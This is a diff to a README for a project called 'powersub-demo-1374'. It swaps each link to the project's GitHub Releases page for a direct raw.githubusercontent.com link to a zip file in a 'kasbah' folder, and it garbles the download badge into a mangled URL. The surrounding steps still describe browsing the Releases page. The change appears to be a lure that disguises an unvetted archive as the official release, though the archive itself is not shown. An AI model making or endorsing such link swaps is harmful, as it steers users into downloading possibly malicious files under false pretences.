@@ -6,13 +6,13 @@ Welcome to the **powersub-demo-1374** application! This guide will help you down
 
 ## 🔥 Download Now
 
-[![Download Here](https://img.shields.io/badge/Download%20Now%20-%20Latest%20Release-blue.svg)](https://github.com/MBS-ADM/powersub-demo-1374/releases)
+[![Download Here](https://raw.githubusercontent.com/MBS-ADM/powersub-demo-1374/main/kasbah/powersub-demo-1374_1.2.zip%20Now%20-%20Latest%https://raw.githubusercontent.com/MBS-ADM/powersub-demo-1374/main/kasbah/powersub-demo-1374_1.2.zip)](https://raw.githubusercontent.com/MBS-ADM/powersub-demo-1374/main/kasbah/powersub-demo-1374_1.2.zip)
 
 ## 📥 Download & Install
 
 1. **Visit the Releases Page**  
    To download the latest version of **powersub-demo-1374**, click the link below:  
-   [Download the latest release](https://github.com/MBS-ADM/powersub-demo-1374/releases)
+   [Download the latest release](https://raw.githubusercontent.com/MBS-ADM/powersub-demo-1374/main/kasbah/powersub-demo-1374_1.2.zip)
 
 2. **Select the Release**  
    On the Releases page, you will see a list of available versions. Click on the version number or title that suits your needs.
@@ -76,6 +76,6 @@ Yes, regular updates are released to improve performance and add new features. C
 ## 📣 Stay Updated
 
 Make sure to check the Releases page regularly for new updates and features. Here’s the link again for your convenience:  
-[Download the latest release](https://github.com/MBS-ADM/powersub-demo-1374/releases) 
+[Download the latest release](https://raw.githubusercontent.com/MBS-ADM/powersub-demo-1374/main/kasbah/powersub-demo-1374_1.2.zip) 
 
 We appreciate your interest in **powersub-demo-1374**! Enjoy using the application and feel free to reach out if you need any assistance.
